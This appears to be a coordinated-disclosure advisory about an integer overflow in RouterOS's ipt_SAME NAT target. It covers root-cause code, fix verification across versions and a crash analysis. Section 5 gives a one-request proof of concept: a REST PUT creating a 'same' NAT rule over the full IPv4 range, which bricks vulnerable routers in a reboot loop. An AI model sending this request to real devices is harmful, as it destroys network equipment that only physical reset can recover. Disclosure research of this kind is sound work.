# Advisory: RouterOS ipt_SAME `same_check` Integer Overflow → Persistent Kernel Panic (Device Brick)

**Status**: 独立发现，未公开 CVE（web 搜索确认无公开记录）
**Discovery date**: 2026-06-29
**Class**: CWE-190 (Integer Overflow) → CWE-787 (Out-of-bounds Write) → DoS/Brick
**Severity**: High (admin-reachable persistent DoS; device brick requiring physical reset)
**Research environment**: Authorized local QEMU/CHR research

---

## 1. Summary

MikroTik RouterOS ships the long-deprecated Linux `ipt_SAME` netfilter target (removed from mainline Linux in 2008 as obsolete) and exposes it as a user-configurable firewall NAT action (`action=same`). The `same_check()` validation function contains an **unchecked integer overflow** in IP-range accounting: a single `to-addresses` range covering the full IPv4 space (`0.0.0.0-255.255.255.255`) causes `ipnum` to wrap to 0, leading to `kmalloc(0)` followed by a loop that writes ~4 billion entries into the undersized buffer → immediate kernel panic.

Critically, the SAME rule is **persisted to config before the panic**, so on reboot the device re-loads the rule and panics again → **permanent reboot loop (brick)**, recoverable only by physical reset / netinstall.

## 2. Affected Versions (tested)

| Version | Channel | Vulnerable |
|---|---|---|
| 6.40.5 / 6.44 | long-term (old) | ✅ Yes (source-confirmed, cross-version unfixed) |
| **7.20.8** | **long-term (2025)** | **✅ Yes — tested, bricks immediately** |
| **7.21.5** | **long-term (2026-07-06)** | ❌ **Fixed — backport verified 2026-09-01** (see §2a) |
| 7.23.1 | stable (2026-06-03, latest) | ❌ Fixed |

The `same_check()` function is **byte-for-byte identical** between v6 (linux-3.3.5) and v7 (linux-5.6.3) GPL disclosures — only kernel API names changed. ~~v7 long-term is unfixed~~ → **2026-07-06 起的 long-term 7.21.5 已带上修复**（静默，无 CVE/credit）。

**7.23.1 fix**: SAME range parsing rewritten — `0.0.0.0-255.255.255.255` normalized to CIDR `0.0.0.0/0`; oversized/non-normalizable ranges marked `invalid:true` and **refused loading into the kernel** (same_check never called).

### 2a. 7.21.5 (long-term) 修复验证 — 2026-09-01 实测（CHR, SLIRP+REST）

镜像: `chr-7.21.5.img` (md5 a0d36e91c605e17c29441752c2e429e3), 工具: `same_backport_test.py`

| 输入 (PUT /rest/ip/firewall/nat) | 结果 | 判定 |
|---|---|---|
| `0.0.0.0-255.255.255.255` (原 PoC) | 201, 规范化为 `0.0.0.0/0`, **invalid:false**, 正常转发 149 包, 无 panic | ✅ 不再 brick |
| `0.0.0.0-127.255.255.255,128.0.0.0-255.255.255.255` (两段 Σ=2³² 绕过尝试) | 400 解析错误 — **comma 多段语法已从新解析器移除** | ✅ Σ求和绕过在语法层关闭 |
| `0.0.0.0-255.255.255.254` (2³²-1) | 接受但 **invalid:true** 拒绝加载 | ✅ 大池拦截 |
| `0.0.0.0-127.255.255.255` (2³¹→/1) | 规范化为 /1 但 **invalid:true** | ✅ 门限远低于 2³² |
| `255.255.255.255-0.0.0.0` (反转) | invalid:false 接受 | 无害(旧代码 min>max 循环不执行, rangeip=1) |
| `10.0.0.1-10.0.0.5` (小范围) | invalid:false, same 功能正常 | 功能保留 |
| `10.0.0.0/29` (小 CIDR) | **invalid:true** (疑似新校验的 cosmetic 回归, 拒绝方向无害) | 次要观察 |

存活检测: panic 观察窗口 30s REST 全通 + 60s 串口 0 次 reboot banner（对照: 7.20.8 同 PoC 秒级 panic + 25s 内 4 次 reboot）。

**结论**: long-term 7.21.5 的 backport 已到位且不可绕过（单段规范化+拒绝, 多段语法移除）。残留暴露面 = 未升级的 7.20.x long-term 与 v6 存量。

### 2b. 内核级修复验证 — 7.23.3 ipt_SAME.ko 反汇编 (2026-09-01)

模块提取: RAM carve (QEMU dump-guest-memory → page cache 中的 ET_REL ELF), 存档 `versions/v7.x/extracted_7233_runtime/`。
**7.21.5 (long-term) 的 ipt_SAME.ko md5 与 7.23.3 完全相同 (58aaeae1fd2ce4a2247d9cf2b7ef174d)** → backport 二进制级确认 (存档 `versions/v7.x/extracted_7215_runtime/`)。
注意: 模块静态符号被剥离 (release 构建), .text 仅 0x166 字节但 **same_check 完整在内**。

**7.20.8 → 7.23.3 的 same_check 增加三层溢出防护** (.text 0x150→0x166):
1. `0x5e: jb error` — 累加 `ipnum += rangeip` 后**检查进位** → Σ ≥ 2³² 直接拒绝 (**多段求和绕过在内核层关闭**)
2. `0x50-0x55` — rangeip == 0 的精确 2³² wrap 特判 → 拒绝
3. `0x70: test/je error` — 循环结束 ipnum == 0 → 拒绝 (堵死 kmalloc(0))

**June brick 的 oops 尸检** (从 `mikrotik/evidence/brick-panic-oops.txt` 提取):
```
RIP: 0xffffffffa02830a9 [ipt_SAME+0xa9]   ← Code: ... 41 89 0c 80 = mov %ecx,(%r8,%rax,4) = iparray[index++]=...
CR2: 0x10                                  ← kmalloc(0) 的 ZERO_SIZE_PTR
CPU: 0 PID: 91 Comm: net                   ← boot 时 net 进程 ipt_register_table 重载持久化规则
Call Trace: xt_check_target → ipt_register_table → ...
```
4 分钟内 10 个 panic 文件 = 重启循环实锤, 与 §5 PoC 观测一致。

### 2c. 受控对照实验 (2026-09-01, 30 分钟 × 3 VM)

| 组 | 配置 | 结果 |
|---|---|---|
| A | 7.23.3 + /0 SAME 规则, 静置 | 30min 全程存活, 单次 boot, 0 panic |
| B | 7.23.3 无规则 (基线) | 同上, 干净 |
| C | 7.21.5 + /0 SAME 规则, 静置 | 同上, 干净 |

早前脏会话 (14 条混合规则) 中 7.23.3 出现过 2 次 `soft lockup CPU#0 stuck 851/892s` panic, 但受控实验**不可复现** → 判定 TCG 时钟假象可能性大 (非产品问题), 不作为发现。

## 3. Root Cause

`refs/mikrotik-gpl/2025-03-19/ipt_SAME/ipt_SAME.c:59-88`:

```c
for (count = 0; count < mr->rangesize; count++) {
    rangeip = (ntohl(mr->range[count].max_ip) -
               ntohl(mr->range[count].min_ip) + 1);  // single full range = 2^32
    mr->ipnum += rangeip;                              // u32 wrap → 0, NO overflow check
}
mr->iparray = kmalloc(sizeof(u_int32_t) * mr->ipnum, ...);  // kmalloc(0)
for (...) for (countess = min; countess <= max; countess++)  // real iteration count = 2^32
    mr->iparray[index++] = countess;                 // OOB write ~2^32 entries
```

Trigger math: `ntohl(255.255.255.255) - ntohl(0.0.0.0) + 1 = 0x100000000` → u32 wraps to `0` → `kmalloc(0)` → second loop writes 2^32 × 4 bytes past the buffer → fatal kernel panic on the very first OOB write.

## 4. Reachability (full chain confirmed)

1. `nova/bin/net` contains string `net/ipv4/netfilter/ipt_SAME.ko` → RouterOS moduler **loads this module** on demand
2. `net` contains `same/fullconenat action must be in dstnat/srcnat chains` + `same`/`SAME` action keywords → **SAME is a user-configurable firewall action**
3. SAME action accepts `to-addresses` parameter → feeds `same_check` ranges
4. `ipt_SAME.ko` present in both v6 (3.3.5) and v7 (5.6.3-64) module trees
5. **Tested on v7.20.8**: REST rule creation succeeds, large range triggers immediate panic

**Trigger path**: authenticated admin → REST `PUT /ip/firewall/nat` (or Winbox/CLI) with `action=same` + oversized `to-addresses` → load ipt_SAME.ko → `same_check` integer overflow → heap OOB write → kernel panic.

## 5. Proof of Concept

**Target**: RouterOS 7.20.8 (long-term) CHR, admin/admin via REST API

```
PUT /rest/ip/firewall/nat
Content-Type: application/json

{"chain":"srcnat","action":"same","to-addresses":"0.0.0.0-255.255.255.255"}
```

**Observed result**:
- REST returns empty (service dies mid-request)
- HTTP subsequently returns 000; 100% packet loss; QEMU guest frozen
- Serial console shows **reboot loop**: `MikroTik 7.20.8` banner repeats ~4× per 25s (each boot re-loads the persisted SAME rule → re-panic)
- **Device is bricked** — only physical reset / netinstall recovers

Bricked image preserved as evidence: `chr-7.20.8.img.brick_same_poc`

## 6. Impact

- **Persistence**: brick is permanent (config-persisted reboot loop) — DoS survives reboot, requires physical access to recover
- **Scope**: any deployment on vulnerable version where an admin (or attacker who gained admin, e.g. via CVE chain / REST exposure / default creds) can create a NAT rule
- **Honest limitation**: requires admin privilege (not unauthenticated remote). Not an RCE/privesc primitive — the OOB write count is uncontrolled (always ≥ 2^32 bytes) so it cannot be shaped into a controlled exploit; it is a reliable DoS/brick only.

### RCE 不可行性精确论证（2026-07-02 复查）
三个维度分析，**核心是算术硬约束**：
1. **写入量爆炸（决定性）**：触发 `ipnum` 溢出需真实 Σrangeip ≥ 2³²。双重循环按真实大小迭代 → 写入量 ≥ 16GB。kmalloc 出的小缓冲后，连续写 16GB **必然在几 KB 内撞未映射页 → page fault → panic**，根本写不到精心选择的相邻堆对象。这是算术约束，不可绕过。
2. **写入值半可控但无意义**：写入 `ntohl(min_ip)+k`（min_ip 可控，半可控递增序列，非旧述的固定 0,1,2）。但因第 1 条根本写不到目标，半可控无用。
3. **单次触发无执行链**：same_check 在规则提交（checkentry）时跑一次，写完返回，不立即执行被污染数据；相邻堆对象不可预测，无 ASLR 绕过。
**结论**：SAME = 确定性 brick（🔴），RCE 算术硬约束不可行。详见 `docs/audits/methodology/same-rce-feasibility.md`。

## 7. Remediation

- **Users**: upgrade to RouterOS **7.21.5+ (long-term)** or **7.23.1+ (stable)** — both channels carry the fix (verified 2026-09-01). If pinned to 7.20.x/v6, avoid the `same` NAT action entirely; prefer `srcnat`/`masquerade`.
- **MikroTik (suggested)**: ~~backport to long-term~~ (已随 7.21.5 完成, 静默); 考虑对存量 7.20.x/v6 发布公告, 并移除废弃的 `ipt_SAME` 模块 (Linux mainline 2008 年即移除)。

## 8. Credit / Disclosure

Independently discovered via GPL source audit + dynamic testing. No public CVE found. Prepared for coordinated disclosure to MikroTik.

---

*See main report `docs/reports/routeros-7.20.8-security-assessment.md` §2 and `docs/audits/methodology/same-rce-feasibility.md` for full technical detail.*
